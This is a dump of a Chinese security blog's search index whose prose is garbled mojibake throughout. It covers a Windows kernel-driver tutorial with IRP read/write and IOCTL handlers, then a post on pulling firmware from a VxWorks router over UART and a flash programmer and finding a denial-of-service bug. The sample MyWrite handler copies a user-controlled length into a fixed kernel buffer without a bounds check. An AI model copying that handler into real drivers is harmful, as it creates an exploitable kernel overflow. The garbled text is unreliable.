ç®¡ç†å™¨ä¸ºåˆ†å±‚é©±åŠ¨ç¨‹åºé“¾ä¸­çš„æ¯ä¸ªé©±åŠ¨ç¨‹åºæä¾›å…¶è®¾ç½®çš„æ¯ä¸ª IRP çš„ I/O å †æ ˆä½ç½®ã€‚ æ¯ä¸ª I/O å †æ ˆä½ç½®éƒ½åŒ…å« ä¸€ä¸ªIO_STACK_LOCATIONç»“æ„ã€‚ MSDNï¼šhttps://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations IRPé€šè¿‡iostackå‘é€ç»™è®¾å¤‡ï¼Œå¯¹åº”çš„æ˜¯åº”ç”¨å±‚çš„â€œæ¶ˆæ¯â€ã€‚è®¾å¤‡å¯ä»¥å­˜åœ¨ï¼ˆç¡¬ç›˜ç­‰ï¼‰ï¼Œä¹Ÿå¯ä»¥ä¸å­˜åœ¨ï¼ˆQQ Protecté©±åŠ¨ç­‰ï¼‰ã€‚ æ ¹æ®ä¸Šå›¾ï¼Œåº”ç”¨å±‚é€šè¿‡å’Œè®¾å¤‡å¯¹è±¡ï¼ˆFDOï¼‰è¿›è¡Œäº¤äº’ï¼Œè®¾å¤‡ï¼ˆPDOï¼‰å†å’Œè®¾å¤‡å¯¹è±¡äº¤äº’ï¼Œå®ç°äº¤äº’ã€‚åŒæ—¶FDOå‘PDOçš„äº¤äº’ä¸æ˜¯å¿…è¦çš„ã€‚ HAL ç¡¬ä»¶æŠ½è±¡å±‚ HALé€šå¸¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åŠ¨æ€é“¾æ¥åº“ï¼Œwindowsè‡ªèº«æºå¸¦å¤šç§HALï¼Œä½†æ˜¯åœ¨ç³»ç»Ÿå®‰è£…çš„æ—¶å€™åªä¼šé€‰æ‹©ä¸€ç§ï¼Œåä¸ºhal.dllã€‚æ¶‰åŠä¸­æ–­æ§åˆ¶å™¨ã€å•å¤„ç†å™¨/å¤šå¤„ç†å™¨ç¡¬ä»¶æ–­ç‚¹ã€‚ B. ä»£ç  åˆ›å»ºè®¾å¤‡ MSDNï¼šhttps://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree ä½¿ç”¨DeviceTreeï¼Œå¯ä»¥æ‰¾åˆ°ï¼šhttps://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip 12345678UNICODE_STRING DeviceName = &#123; 0 &#125;; //è®¾å¤‡åPDEVICE_OBJECT pDevice = NULL; //è®¾å¤‡å¯¹è±¡RtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);Status = IoCreateDevice(DriverObject, 0, &amp;DeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;pDevice);if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Device Failed: %x\\n&quot;, Status); return Status;&#125; åˆ›å»ºç¬¦å·é“¾æ¥ ç¬¦å·é“¾æ¥å°±æ˜¯ç±»ä¼¼ä¸Z:\\ä¹‹å‰çš„å‰ç¼€ ä½¿ç”¨WinObjå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç”¨çš„å†ç¬¬ä¸€ç« ä¸­ä¸‹è½½çš„KdmKieä¸­çš„SymLinksï¼ˆå¤ªè€äº†ï¼Œå»ºè®®æ¢ä¸€ä¸ªï¼‰ 12345678UNICODE_STRING SymLink = &#123; 0 &#125;;RtlInitUnicodeString(&amp;SymLink, SYM_NAME);Status = IoCreateSymbolicLink(&amp;SymLink, &amp;DeviceName);if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Symbol Link Failed: %x\\n&quot;, Status); IoDeleteDevice(pDevice); return Status;&#125; å…³è”åŠŸèƒ½çš„äº¤äº’ I. åˆ›å»ºâ€œå¥æŸ„â€ MSDNï¼šhttps://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs å…·ä½“è°ƒè¯•æ–¹æ³•ä¹Ÿåœ¨ä¸Šé¢çš„æ–‡æ¡£ä¸­ æ¯ä¸ªå†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åºéƒ½å¿…é¡»å®ç°åä¸º DriverEntry çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨åŠ è½½é©±åŠ¨ç¨‹åºä¹‹åä¼šç«‹å³å¾—åˆ°è°ƒç”¨ã€‚ DriverEntry å‡½æ•°ä½¿ç”¨æŒ‡å‘é©±åŠ¨ç¨‹åºå®ç°çš„ä¸€äº›å…¶ä»–å‡½æ•°çš„æŒ‡é’ˆæ¥å¡«å…… DRIVER_OBJECT ç»“æ„çš„æŸäº›æˆå‘˜ã€‚ ä¾‹å¦‚ï¼ŒDriverEntry å‡½æ•°ä½¿ç”¨æŒ‡å‘é©±åŠ¨ç¨‹åºçš„ Unload å‡½æ•°çš„æŒ‡é’ˆæ¥å¡«å…… DRIVER_OBJECT ç»“æ„çš„ Unload æˆå‘˜ 1DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate; æ ¹æ®ä¸Šé¢çš„æ–‡æ¡£ï¼Œåˆ›å»ºçš„å‡½æ•°å’Œä¸»å‡½æ•°Entryå·®ä¸å¤šï¼Œè¿™é‡Œç”¨çš„æ˜¯è®¾å¤‡å¯¹è±¡ï¼Œä¸æ˜¯é©±åŠ¨å¯¹è±¡ 123456789NTSTATUS MyCreate(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Opened\\n&quot;); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; II. å…³é—­â€œå¥æŸ„â€ 12DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean; 12345678910111213141516171819NTSTATUSMyClose(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Closed\\n&quot;); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125;NTSTATUSMyClean(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Clean\\n&quot;); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; æˆåŠŸåŠ è½½ III. åœ¨Ring3è¿›è¡Œäº¤äº’ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;windows.h&gt;int main()&#123; HANDLE hDevice = NULL; hDevice = CreateFileW(L&quot;\\\\\\\\.\\\\My1DeviceLinker&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice== INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;Error Create File\\n&quot;; system(&quot;pause&quot;); return 0; &#125; std::cout &lt;&lt; &quot;Success open\\n&quot;; system(&quot;pause&quot;); CloseHandle(hDevice); std::cout &lt;&lt; &quot;Success close\\n&quot;; system(&quot;pause&quot;); return 0;&#125; C. äºŒé˜¶æ®µ MSDNï¼šhttps://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice å…³äºåˆ›å»ºè®¾å¤‡çš„åŸå‹ 123456789NTSTATUS IoCreateDevice( [in] PDRIVER_OBJECT DriverObject, [in] ULONG DeviceExtensionSize, [in, optional] PUNICODE_STRING DeviceName, [in] DEVICE_TYPE DeviceType, [in] ULONG DeviceCharacteristics, [in] BOOLEAN Exclusive, [out] PDEVICE_OBJECT *DeviceObject); 1[in] DeviceExtensionSize æŒ‡å®šè¦ä¸º è®¾å¤‡å¯¹è±¡çš„è®¾å¤‡æ‰©å±• åˆ†é…çš„é©±åŠ¨ç¨‹åºç¡®å®šçš„å­—èŠ‚æ•°ã€‚ è®¾å¤‡æ‰©å±•çš„å†…éƒ¨ç»“æ„æ˜¯é©±åŠ¨ç¨‹åºå®šä¹‰çš„ã€‚ ç»´æŠ¤è®¾å¤‡çŠ¶æ€ä¿¡æ¯ã€‚ ä¸ºé©±åŠ¨ç¨‹åºä½¿ç”¨çš„ä»»ä½•å†…æ ¸å®šä¹‰å¯¹è±¡æˆ–å…¶ä»–ç³»ç»Ÿèµ„æºï¼ˆå¦‚æ—‹è½¬é”ï¼‰æä¾›å­˜å‚¨ã€‚ ä¿å­˜é©±åŠ¨ç¨‹åºå¿…é¡»åœ¨ç³»ç»Ÿç©ºé—´ä¸­é©»ç•™çš„ä»»ä½•æ•°æ®ï¼Œä»¥æ‰§è¡Œå…¶ I/O æ“ä½œã€‚ é‚£ä¹ˆè¿™å°±æ˜¯ä¸€æ®µæè¿°è¦ä¼ è¾“çš„æ•°æ®çš„ç©ºé—´çš„å¤§å°çš„å€¼ã€‚ ä»é©±åŠ¨ä¸­è¯»å– é©±åŠ¨MyReadå‡½æ•°å’ŒDriverEntry 123456789101112131415161718NTSTATUSMyRead(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; UNREFERENCED_PARAMETER(pdevice); NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Read\\n&quot;); PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG ReadSize = pStack-&gt;Parameters.Read.Length; PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer; DbgPrint(&quot;Ring3 Want Read %x\\n&quot;, ReadSize); RtlCopyMemory(Buffer, &quot;Message From Driver&quot;, strlen(&quot;Message From Driver&quot;)); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = strlen(&quot;Message From Driver&quot;); IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; R3 12345CHAR Test[0x40] = &#123; 0 &#125;;DWORD lpRead = 0;ReadFile(hDevice, Test, 30, &amp;lpRead, NULL);printf(&quot;%p -%s--%d\\n&quot;, Test, Test,lpRead); 30æ˜¯è¦è¯»å–çš„å­—èŠ‚ lpReadæ˜¯çœŸå®è¯»å–çš„å­—èŠ‚ æ¯å‘ä¸‹ä¼ é€’ä¸€å±‚éœ€è¦ä¸€ä¸ªè®¾å¤‡æ ˆï¼ˆå¯ä»¥è¯•ç€ä»è‡ªå·±è®¾è®¡è¿™æ ·ä¸€ä¸ªæ¨¡å¼çš„è§’åº¦æƒ³æƒ³ï¼‰ SystemBufferå’ŒpIrp-&gt;MdlAddressæ˜¯åŒä¸€å—ç‰©ç†åœ°å€çš„ä¸¤ä¸ªä¸åŒè™šæ‹Ÿåœ°å€ï¼ˆä¸åŒçš„æ˜ å°„ï¼‰ã€‚ éœ€è¦è®¾ç½®è¯»å†™æ–¹å¼ 12pDevice-&gt;Flags |= DO_BUFFERED_IO;//è®¾å¤‡åˆ›å»ºæˆåŠŸï¼Œç»‘å®šç¬¦å·é“¾æ¥ å‘é©±åŠ¨ä¸­å†™å…¥ R3 1WriteFile(hDevice, &quot;This is From Ring3.&quot;, strlen(&quot;This is From Ring3.&quot;), &amp;lpRead, NULL); é©±åŠ¨ 1234567891011121314151617181920NTSTATUSMyWrite(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; UNREFERENCED_PARAMETER(pdevice); NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has Wrtitten\\n&quot;); PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG ReadSize = pStack-&gt;Parameters.Write.Length; PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer; DbgPrint(&quot;Ring3 Write Read %x\\n&quot;, ReadSize); RtlZeroMemory(pdevice-&gt;DeviceExtension, 200); RtlCopyMemory(pdevice-&gt;DeviceExtension, Buffer, ReadSize); DbgPrint(&quot;--%p-%s\\n&quot;, Buffer, (PCHAR)pdevice-&gt;DeviceExtension); pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = strlen(&quot;Message From Driver&quot;); IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; [IOCTL]è‡ªå®šä¹‰æ§åˆ¶IO IRP_MJ_DEVICE_CONTROLï¼Œå®šä¹‰IOCTLæ“ä½œï¼Œå¾ˆå¤šå†…æ ¸çš„äº¤äº’å¤§å¤šéƒ½æ˜¯ä¾é æ­¤æ–¹å¼ è¿™é‡Œç¨‹åºæ¥æ”¶ä¸€ä¸ªæ•°å­—è¿”å›å€¼x2 é©±åŠ¨ å®šä¹‰æ“ä½œæ ‡è¯† MSDNï¼šhttps://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code 12#define IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS) 0x9888ï¼šæ ‡è¯†ç¬¦å· ç¼–å†™å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435NTSTATUSMyControl(PDEVICE_OBJECT pdevice, PIRP pIrp) &#123; UNREFERENCED_PARAMETER(pdevice); NTSTATUS RET = STATUS_SUCCESS; DbgPrint(&quot;My Device Has IOCTL\\n&quot;); PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp); ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode; //åŠŸèƒ½ç  ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength; //å‡ºå…¥é•¿åº¦ //ULONG outLen = pStack-&gt;Parameters.DeviceIoControl.OutputBufferLength; //è¾“å‡ºé•¿åº¦ ULONG ioInfo = 0; switch (ioCode) &#123; case IOCTL_MUL: &#123; DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer; //å–å‡ºä¼ è¾“çš„æ•°æ® DbgPrint(&quot;Kernel Recive: %d, Len: %lld\\n&quot;, inData, inLen); inData *= 2; DbgPrint(&quot;Kernel Data %d\\n&quot;, inData); *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData; //å†™å›æ“ä½œ ioInfo = 4; break; &#125; default: RET = STATUS_UNSUCCESSFUL; ioInfo = 0; break; &#125; pIrp-&gt;IoStatus.Status = RET; pIrp-&gt;IoStatus.Information = ioInfo; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return RET;&#125; ä¸€äº›å…³é”®å‡½æ•° DriverEntry 12345678910111213141516171819202122232425262728293031323334353637383940414243NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS Status = STATUS_SUCCESS; DbgPrint(&quot;Driver Running -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName); DriverObject-&gt;DriverUnload = DriverUnload; //åˆ›å»ºè®¾å¤‡ UNICODE_STRING DeviceName = &#123; 0 &#125;; //è®¾å¤‡å PDEVICE_OBJECT pDevice = NULL; //è®¾å¤‡å¯¹è±¡ RtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME); Status = IoCreateDevice(DriverObject, 0x200, &amp;DeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &amp;pDevice); if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Device Failed: %x\\n&quot;, Status); return Status; &#125; pDevice-&gt;Flags |= DO_BUFFERED_IO; //è®¾å¤‡åˆ›å»ºæˆåŠŸï¼Œç»‘å®šç¬¦å·é“¾æ¥ UNICODE_STRING SymLink = &#123; 0 &#125;; RtlInitUnicodeString(&amp;SymLink, SYM_NAME); Status = IoCreateSymbolicLink(&amp;SymLink, &amp;DeviceName); if (!NT_SUCCESS(Status)) &#123; DbgPrint(&quot;Create Symbol Link Failed: %x\\n&quot;, Status); IoDeleteDevice(pDevice); return Status; &#125; DbgPrint(&quot;Device &amp; Symbolic Link Created\\n&quot;); DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate; DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose; DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean; DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyRead; DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = MyWrite; DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyControl; DbgPrint(&quot;Function Settal Done\\n&quot;); return Status;&#125; DriverUnload 1234567891011121314VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Driver Stopping -&gt; %wZ\\n&quot;, &amp;DriverObject-&gt;DriverName); DbgPrint(&quot;Device Stopping\\n&quot;); if (DriverObject-&gt;DeviceObject) &#123; IoDeleteDevice(DriverObject-&gt;DeviceObject); UNICODE_STRING symname = &#123; 0 &#125;; RtlInitUnicodeString(&amp;symname, SYM_NAME); IoDeleteSymbolicLink(&amp;symname); &#125;&#125; ç”¨äºåœ¨Ring3äº¤äº’çš„é¡¹ç›®çš„ä¸»å‡½æ•° 1234567891011121314151617181920212223242526272829// R3Control.cpp : æ­¤æ–‡ä»¶åŒ…å« &quot;main&quot; å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚//#include &lt;iostream&gt;#include &lt;windows.h&gt;#define IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)int main()&#123; HANDLE hDevice = NULL; hDevice = CreateFileW(L&quot;\\\\\\\\.\\\\My1DeviceLinker&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice== INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;Error Create File\\n&quot;; return 0; &#125; std::cout &lt;&lt; &quot;Success open\\n&quot;; system(&quot;pause&quot;); std::cout &lt;&lt; &quot;now IOCTL\\n&quot;; DWORDLONG a = 64; DWORDLONG b = 0; DWORD info = 0; DeviceIoControl(hDevice, IOCTL_MUL, &amp;a, sizeof(DWORDLONG), &amp;b, sizeof(DWORDLONG), &amp;info, NULL); printf(&quot;value a: %lld, b: %lld\\nreal info %d\\n&quot;, a, b, info); CloseHandle(hDevice); std::cout &lt;&lt; &quot;Success close\\n&quot;; return 0;&#125; å‚è€ƒ https://www.bilibili.com/video/BV1QJ411A7kR https://space.bilibili.com/1992190180/ https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"ã€æ¼æ´æŒ–æ˜ã€‘è®°ä¸€æ¬¡ç—›è‹¦çš„VxWorksè·¯ç”±å™¨æ¼æ´æŒ–æ˜","slug":"MW300R-vuln","date":"2024-01-12T06:41:03.000Z","updated":"2024-01-12T07:58:42.061Z","comments":true,"path":"2024/01/12/MW300R-vuln/","link":"","permalink":"https://joe1sn.eu.org/2024/01/12/MW300R-vuln/","excerpt":"é—®é¢˜å¤šåˆå¤š","text":"é—®é¢˜å¤šåˆå¤š è®°ä¸€æ¬¡ç—›è‹¦çš„VxWorksè·¯ç”±å™¨æ¼æ´æŒ–æ˜ è·¯ç”±å™¨å¾ˆè€äº†ï¼Œæ˜¯Mercury MW300Rçš„æŸä¸ªç‰ˆæœ¬ï¼Œç½‘ä¸Šæ‰¾ä¸åˆ°å›ºä»¶ï¼Œæ‰€ä»¥æœ€å¼€å§‹æƒ³ç”¨uartè¿›shell æ‹†å¼€è¿‡åå¯ä»¥å¿«é€Ÿæ‰¾åˆ°UARTå¼•è„š UARTè°ƒè¯• I æ‰“å¼€UART è·¯ç”±å™¨æ–­ç”µï¼Œç„¶åæŠŠä¸‡ç”¨è¡¨è°ƒåˆ°æµ‹æ¥åœ°ï¼Œé»‘ç¬”éšä¾¿æ‰¾ä¸€ä¸ªç”µè·¯æ¿ä¸Šçš„æ¥å£ï¼ˆæˆ‘ç”¨çš„wifiå¤©çº¿çš„ï¼‰ï¼Œçº¢ç¬”æµ‹å£å­ï¼Œå“çš„é‚£ä¸ªå°±æ˜¯æ¥åœ° æ¥ç€è·¯ç”±å™¨è¿ä¸Šç”µæºï¼Œä¸‡ç”¨è¡¨è°ƒåˆ°æµ‹ç”µå‹ï¼Œé»‘ç¬”éšä¾¿æ‰¾ä¸€ä¸ªç”µè·¯æ¿ä¸Šçš„æ¥å£ï¼Œçº¢ç¬”æŒ¨ä¸ªæµ‹è¯•æ¥å£ å¦‚æœä¸º3.3Vå·¦å³ï¼Œé‚£ä¹ˆæ˜¯ç”µæºçº¿ï¼ˆ3.3Vï¼‰ å¦‚æœä¸º0Vï¼Œä¸ºæ¥åœ°ï¼ˆGNDï¼‰ å¦‚æœä¸º2.5Vå·¦å³ï¼Œä¸ºTXDï¼ˆè·¯ç”±å™¨çš„Writeï¼‰ å¦‚æœä¸æ–­è·³åŠ¨ï¼Œä¸ºRXDï¼ˆè·¯ç”±å™¨çš„Readï¼‰ ç„¶åç¬¬ä¸€ç‚¹ä¸å¯»å¸¸çš„å°±æ¥äº† æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™åªèƒ½é€šè¿‡æ’é™¤æ³•ç­›é€‰å‡ºäº†RXDï¼Œæˆ‘çš„RXDä¸€ç›´ä¸º0V è¿™ä¸ªæ—¶å€™é€šè¿‡ 1234FT232: 3.3V -&gt; è·¯ç”±å™¨: 3.3vFT232: GND -&gt; è·¯ç”±å™¨: GNDFT232: RXD -&gt; è·¯ç”±å™¨: TXDFT232: TXD -&gt; è·¯ç”±å™¨: RXD æ’ä¸Šè·¯ç”±å™¨ç”µæºçº¿ï¼Œä½†æ˜¯ä¸æ’æ’å¤´ï¼Œé€šè¿‡ä¸²å£å°±èƒ½è¿ä¸Šäº† ä½†æ˜¯ä¼šå‘ç°æ— æ³•è¾“å…¥ï¼Œå¯¼è‡´è®¾å¤‡ä¸€ç›´é‡å¯ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹æ— æ³•åœä¸‹autobootï¼Œå¾ˆæ˜¾ç„¶éœ€è¦è¾“å…¥æ¥æ‰“æ–­ ä½†æ˜¯è·¯ç”±å™¨çš„RXDä¸€ç›´ä¸º0Vï¼Œè¯´æ˜å¹¶æ²¡æœ‰å¼€å¯å‘è·¯ç”±å™¨å†™å…¥çš„åŠŸèƒ½ï¼Œé€šè¿‡ä»”ç»†è§‚å¯Ÿç”µè·¯ï¼Œå‘ç°RXDå‡ºå£æœ‰ä¸‹é¢å‡ ä¸ªæ¥å£ï¼Œä¸æ–­æµ‹è¯•å‘ç°RXDå¯ä»¥åœ¨ä¸‹æ–¹çš„ç„Šç‚¹ä½¿ç”¨ ä½†æ˜¯æˆ‘æ²¡æœ‰æ¶å­ï¼Œè€Œä¸”ç„Šç‚¹å¤ªå°äº†ï¼ˆæœ¬äººç”µçƒ™é“å¤ªèœï¼‰ï¼Œæ‰€ä»¥æŠ˜å¼¯äº†ä¸€æ ¹æ›²åˆ«é’ˆæ¥ä¼ ä¿¡å· II å¼€å§‹è°ƒè¯• A èƒ½ç”¨çš„åŠŸèƒ½ç‰¹åˆ«å°‘ï¼Œè€Œä¸”tftpåŠŸèƒ½ç”¨ä¸äº†ï¼Œä¸è¿‡mdå¯ä»¥æŸ¥çœ‹å†…å­˜ å…¶å®è¿™é‡Œå¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢è¿›è¡Œdumpæå–çš„ï¼Œä½†æ˜¯å½“æ—¶æ²¡æƒ³åˆ°ã€‚ III å¼€å§‹è°ƒè¯• B åœ¨è¿›å…¥ubootçš„æ—¶å€™å‘ç°ctrl+Cä¼šæ‰“æ–­ä¸€ä¸ªTP-Linkçš„shell åç»­å‘ç°æ’ä¸Šæ’å¤´åæœ‰æ¦‚ç‡ä¼šåœåœ¨è¿™é‡Œ ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹å†…å­˜åˆ†é… 1flash -layout çœ‹åˆ°è¿™é‡Œæˆ‘æ‰æ˜ç™½æœ€å¼€å§‹è¿›çš„æ˜¯ubootçš„æ§åˆ¶çª—å£ï¼Œè¿™é‡Œæ‰æ˜¯çœŸæ­£çš„Flashå­˜å‚¨çš„å¯åŠ¨ç‚¹ ä¿®æ”¹äº†è¿™ç¯‡åšå®¢çš„è„šæœ¬æŒ‰ç…§ä¸€æ ·çš„æ€è·¯è¯•å›¾æå–å›ºä»¶å‡ºæ¥ï¼Œä½†æ˜¯binwalkæ²¡æœ‰ä»»ä½•è¯†åˆ«ï¼Œæ‰€ä»¥UARTèµ°åˆ°å°½å¤´äº† CHA341Aæ³• å°±æ˜¯ä¼ ç»Ÿçš„é£çº¿æ³•ï¼Œè·¯ç”±å™¨ä¸Šèƒ½ç”¨èŠ¯ç‰‡å¤¹çš„å°±ä¸¤ä¸ªèŠ¯ç‰‡ï¼Œç”¨CHA341ç¼–ç¨‹å™¨è¯»å–ä¸€ä¸‹å°±çŸ¥é“äº†ï¼ˆè®°å¾—è£…é©±åŠ¨ï¼‰ å…³äºç»„è£…å¯ä»¥çœ‹è¿™ç¯‡ èŠ¯ç‰‡æ²¡æœ‰è¯†åˆ«åˆ°ï¼Œä½†æ˜¯é‡è¦çš„æ˜¯èŠ¯ç‰‡å­˜å‚¨çš„å¤§å°ï¼Œé€šè¿‡ä¸Šflash layoutå¯ä»¥çœ‹åˆ°æ€»ç©ºé—´å¤§å°æ˜¯1024KB=1MBï¼Œé€‰æ‹©å¤§å°ä¸º1MBçš„èŠ¯ç‰‡å°±å¥½äº† ç”¨binwalkçœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯VxWorksçš„ç³»ç»Ÿï¼Œè€Œä¸”æ ¹æœ¬å°±æ²¡æœ‰Unix/Linuxçš„æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯ä½¿ç”¨äº†Wind River æ–‡ä»¶ç³»ç»Ÿï¼Œæ€ªä¸å¾—æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯ä¸€å¨ï¼Œè€Œä¸”çŸ¥é“äº†ç¨‹åºå…¥å£æ˜¯0x80001000 å¯ä»¥å‚è€ƒè¿™ç¯‡æ¥æ…¢æ…¢æå–ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥ç›´æ¥ 1binwalk -Me MW300R.bin çœ‹ä¸Šå»æŒºå¤šçš„ï¼Œå…¶å®æ ¹æœ¬ä¸æ…Œï¼Œéšä¾¿çœ‹ä¸€ä¸ª å†çœ‹çœ‹Wind Riveré‚£æ®µçš„æ•°æ®ï¼ŒæŒ‰é¡ºåºå°±å¯¹å¯¹åº”çš„ä¸åŒæ–‡ä»¶äº† å¯ä»¥æŒ‰ç…§å¯¹åº”çš„æ ¼å¼å†™è„šæœ¬æå–ï¼Œä¸è¿‡æœ¬æ–‡çš„ä¸­å¿ƒå¹¶ä¸åœ¨è¿™å„¿ã€‚ åœ¨æå–çš„æ—¶å€™å‘ç° æŠŠ49200æ–‡ä»¶ç‰¹æ®Šçœ‹ä¸€ä¸‹ æ­å–œï¼Œæ‰¾åˆ°äº†ä¸»è¦æ–‡ä»¶çš„ ç”¨ida 32ä½ MIPSå¤§ç«¯åºæ‰“å¼€ æ ¹æ®å‰æ–‡æåˆ°çš„å…¥å£åœ°å€0x80001000è®¾ç½®å…¥å£ åœ¨å¼€å¤´æŒ‰ä¸‹Cå°±IDAå°±å¼€å§‹è‡ªåŠ¨åˆ†æäº† æ¼æ´æŒ–æ˜ ä¸Šé¢çš„äºŒè¿›åˆ¶åˆ†æèµ·æ¥è¿˜æ˜¯æœ‰éš¾åº¦çš„ï¼Œä¸è¿‡ç”¨å¸¸è§„æ€è·¯ï¼ˆåŒ…æ‹¬webï¼‰å³å¯ æ¯”å¦‚ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„DOSæ´ï¼Œå¾ˆæ˜æ˜¾åªåšäº†å‰ç«¯æ ¡éªŒ ç›´æ¥æŠŠè·¯ç”±å™¨æ‰“å´©ï¼Œå¾—é‡å¯æ‰èƒ½æ¢å¤æ­£å¸¸å·¥ä½œ å¼•ç”¨ https://paper.seebug.org/2024 https://e3pem.github.io/2019/07/03/IoT/æå–tl-wdr5620å›ºä»¶/ https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"æ¼æ´æŒ–æ˜","slug":"æ¼æ´æŒ–æ˜","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}]},{"title":"ã€STM32ã€‘1.ç‚¹ç¯å¤§å¸ˆ","slug":"stm32-1-light","date":"2023-09-10T11:51:40.000Z","updated":"2023-09-10T13:11:53.162Z","comments":true,"path":"2023/09/10/stm32-1-light/","link":"","permalink":"https://joe1sn.eu.org/2023/09/10/stm32-1-light/","excerpt":"å¦‚ä½•ä¸‰å°æ—¶ä¹‹å†…ï¼Œä»0å¼€å§‹å­¦ä¼šstm32ç‚¹ç¯ 